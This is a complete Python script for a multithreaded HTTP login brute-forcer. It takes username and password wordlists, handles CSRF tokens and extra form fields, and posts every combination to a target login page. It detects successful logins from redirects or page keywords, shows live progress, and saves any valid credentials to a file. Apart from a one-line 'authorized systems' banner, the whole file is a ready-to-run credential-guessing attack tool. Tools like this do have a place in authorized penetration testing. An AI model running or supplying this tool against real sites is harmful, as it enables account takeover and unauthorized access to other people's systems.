#!/usr/bin/env python3
import argparse
import logging
import os
import sys
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional, Dict, Tuple  # Added Tuple import here
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress
from rich.live import Live
from rich.layout import Layout

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('http_brute.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

console = Console()

class HTTPLoginBruteForcer:
    def __init__(self):
        self.display_banner()
        self.args = self.parse_arguments()
        self.validate_arguments()
        self.initialize_scan()
        
    def display_banner(self):
        """Show professional ASCII banner"""
        console.print(Panel.fit(
            "HTTP LOGIN BRUTEFORCER",
            title="[bold red]WEB AUTHENTICATION TESTER[/bold red]",
            subtitle="[yellow]Use only on authorized systems[/yellow]",
            border_style="blue"
        ))

    def parse_arguments(self):
        """Configure command line arguments"""
        parser = argparse.ArgumentParser(
            description='Professional HTTP login brute-forcer',
            formatter_class=argparse.ArgumentDefaultsHelpFormatter
        )
        
        # Required arguments
        parser.add_argument('target', help='Base target URL (e.g., http://example.com)')
        parser.add_argument('--login-url', required=True,
                          help='Full login page URL (e.g., http://example.com/login)')
        
        # Credential options
        parser.add_argument('-u', '--username', required=True,
                          help='Username or file containing usernames')
        parser.add_argument('-P', '--password', required=True,
                          help='Password or file containing passwords')
        
        # Form options
        parser.add_argument('--username-field', default='username',
                          help='Form username field name')
        parser.add_argument('--password-field', default='password',
                          help='Form password field name')
        parser.add_argument('--csrf-field', 
                          help='CSRF token field name (if applicable)')
        parser.add_argument('--extra-fields', nargs='*',
                          help='Extra form fields (format: field=value)')
        
        # Connection options
        parser.add_argument('-T', '--timeout', type=int, default=10,
                          help='Connection timeout in seconds')
        parser.add_argument('-d', '--delay', type=float, default=0.5,
                          help='Delay between attempts in seconds')
        
        # Performance options
        parser.add_argument('-t', '--threads', type=int, default=4,
                          help='Number of concurrent workers')
        
        # Output options
        parser.add_argument('-v', '--verbose', action='store_true',
                          help='Show verbose output')
        
        return parser.parse_args()

    def validate_arguments(self):
        """Validate input arguments"""
        if not self.args.target.startswith(('http://', 'https://')):
            console.print("[red]Error: Target must start with http:// or https://[/red]")
            sys.exit(1)
            
        if not 1 <= self.args.threads <= 10:
            console.print("[red]Error: Thread count must be between 1-10[/red]")
            sys.exit(1)

    def initialize_scan(self):
        """Initialize scan parameters"""
        # Load credentials
        self.usernames = self.load_wordlist(self.args.username)
        self.passwords = self.load_wordlist(self.args.password)
        self.total_combinations = len(self.usernames) * len(self.passwords)
        
        # Parse extra form fields
        self.extra_fields = {}
        if self.args.extra_fields:
            for field in self.args.extra_fields:
                if '=' in field:
                    key, value = field.split('=', 1)
                    self.extra_fields[key] = value
        
        # Initialize tracking
        self.attempts = 0
        self.credentials_found = []
        self.start_time = time.time()
        self.current_attempt = ("", "")
        self.shutdown_flag = False
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Accept-Language': 'en-US,en;q=0.5'
        })

    def load_wordlist(self, source: str) -> List[str]:
        """Load credentials from file or string"""
        if os.path.isfile(source):
            try:
                with open(source, 'r', encoding='utf-8', errors='ignore') as f:
                    return [line.strip() for line in f if line.strip() if line.strip()]
            except Exception as e:
                logger.error(f"Failed to load {source}: {str(e)}")
                console.print(f"[red]Error reading {source}: {str(e)}[/red]")
                sys.exit(1)
        return [source]

    def get_csrf_token(self) -> Optional[str]:
        """Extract CSRF token from login page if needed"""
        if not self.args.csrf_field:
            return None
            
        try:
            response = self.session.get(
                self.args.login_url,
                timeout=self.args.timeout
            )
            response.raise_for_status()
            
            # Simple HTML parsing for CSRF token
            for line in response.text.split('\n'):
                if self.args.csrf_field in line and 'value=' in line:
                    start = line.find('value="') + 7
                    end = line.find('"', start)
                    return line[start:end]
        except Exception as e:
            logger.warning(f"Failed to get CSRF token: {str(e)}")
            
        return None

    def test_credentials(self, username: str, password: str) -> Tuple[str, str, bool]:
        """Test credentials against the login page"""
        if self.shutdown_flag:
            return username, password, False
            
        self.current_attempt = (username, password)
        self.attempts += 1
        
        if self.args.delay > 0:
            time.sleep(self.args.delay)
        
        try:
            # Prepare form data
            form_data = {
                self.args.username_field: username,
                self.args.password_field: password
            }
            
            # Add extra fields
            form_data.update(self.extra_fields)
            
            # Add CSRF token if needed
            if self.args.csrf_field:
                csrf_token = self.get_csrf_token()
                if csrf_token:
                    form_data[self.args.csrf_field] = csrf_token
            
            # Send login request
            response = self.session.post(
                self.args.login_url,
                data=form_data,
                allow_redirects=False,
                timeout=self.args.timeout
            )
            
            # Check for successful login indicators
            if self.check_success(response, username):
                return username, password, True
                
        except Exception as e:
            logger.error(f"Error testing {username}:{password} - {str(e)}")
            
        return username, password, False

    def check_success(self, response, username: str) -> bool:
        """Determine if login was successful"""
        # Check HTTP status code
        if response.status_code in [301, 302, 303]:
            location = response.headers.get('Location', '').lower()
            if 'login' not in location and 'error' not in location:
                return True
        
        # Check for common success indicators
        success_indicators = [
            'logout', 'welcome', 'dashboard', 
            'my account', username.lower()
        ]
        
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in success_indicators)

    def generate_display(self) -> Layout:
        """Create live progress display"""
        layout = Layout()
        layout.split(
            Layout(name="header", size=5),
            Layout(name="progress", size=8),
            Layout(name="results")
        )
        
        # Header panel
        header_table = Table.grid(expand=True)
        header_table.add_column(style="bold blue")
        header_table.add_column(style="cyan")
        header_table.add_row("Target:", self.args.target)
        header_table.add_row("Login URL:", self.args.login_url)
        header_table.add_row("Threads:", str(self.args.threads))
        layout["header"].update(Panel(header_table, title="Scan Parameters"))
        
        # Progress panel
        elapsed = max(0.1, time.time() - self.start_time)
        current_user, current_pass = self.current_attempt
        
        progress_table = Table.grid(expand=True)
        progress_table.add_column(style="bold blue")
        progress_table.add_column(style="cyan")
        progress_table.add_row("Current Attempt:", f"{current_user}:{current_pass}")
        progress_table.add_row("Attempts:", f"{self.attempts}/{self.total_combinations}")
        
        if self.total_combinations > 0:
            progress_percent = (self.attempts / self.total_combinations) * 100
            progress_table.add_row("Progress:", f"{progress_percent:.1f}%")
            
            if self.attempts > 0:
                remaining = (elapsed / self.attempts) * (self.total_combinations - self.attempts)
                progress_table.add_row("ETA:", f"{remaining:.1f}s")
        
        progress_table.add_row("Elapsed:", f"{elapsed:.1f}s")
        progress_table.add_row("Speed:", f"{self.attempts/elapsed:.1f} attempts/s")
        layout["progress"].update(Panel(progress_table, title="Scan Progress"))
        
        # Results panel
        if self.credentials_found:
            results_table = Table(title="Valid Credentials", show_lines=True)
            results_table.add_column("Username", style="bold green")
            results_table.add_column("Password", style="green")
            for user, pwd in self.credentials_found:
                results_table.add_row(user, pwd)
            layout["results"].update(Panel(results_table))
        else:
            layout["results"].update(Panel("No valid credentials found yet..."))
            
        return layout

    def run_scan(self):
        """Execute the credential scan"""
        console.print(f"\n[bold]Starting scan against {self.args.target}[/bold]")
        console.print(f"Testing {len(self.usernames)} users × {len(self.passwords)} passwords = {self.total_combinations} combinations\n")
        
        try:
            with Live(self.generate_display(), refresh_per_second=4, screen=True) as live:
                with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
                    futures = [
                        executor.submit(self.test_credentials, user, pwd)
                        for user in self.usernames
                        for pwd in self.passwords
                    ]
                    
                    for future in as_completed(futures):
                        username, password, success = future.result()
                        live.update(self.generate_display())
                        
                        if success:
                            self.credentials_found.append((username, password))
                            if not self.args.verbose:
                                self.shutdown_flag = True
                                executor.shutdown(wait=False)
                                break
            
            # Show final results
            self.show_final_results()
            
        except KeyboardInterrupt:
            console.print("\n[yellow]Scan interrupted by user[/yellow]")
            self.show_final_results()
            sys.exit(0)
        except Exception as e:
            console.print(f"\n[red]Fatal error: {str(e)}[/red]")
            sys.exit(1)

    def show_final_results(self):
        """Display final scan results"""
        console.print("\n[bold]Scan completed![/bold]")
        console.print(f"Tested {self.attempts} combinations in {time.time() - self.start_time:.1f} seconds")
        
        if self.credentials_found:
            console.print("\n[bold green]VALID CREDENTIALS FOUND:[/bold green]")
            results_table = Table(show_header=True, header_style="bold green")
            results_table.add_column("Username", style="cyan")
            results_table.add_column("Password", style="green")
            
            for user, pwd in self.credentials_found:
                results_table.add_row(user, pwd)
                
            console.print(results_table)
            
            # Save to file
            with open('credentials_found.txt', 'w') as f:
                for user, pwd in self.credentials_found:
                    f.write(f"{user}:{pwd}\n")
            console.print(f"\nCredentials saved to [cyan]credentials_found.txt[/cyan]")
        else:
            console.print("\n[bold red]No valid credentials found[/bold red]")

if __name__ == '__main__':
    try:
        tool = HTTPLoginBruteForcer()
        tool.run_scan()
    except KeyboardInterrupt:
        console.print("\n[red]Tool terminated by user[/red]")
        sys.exit(0)
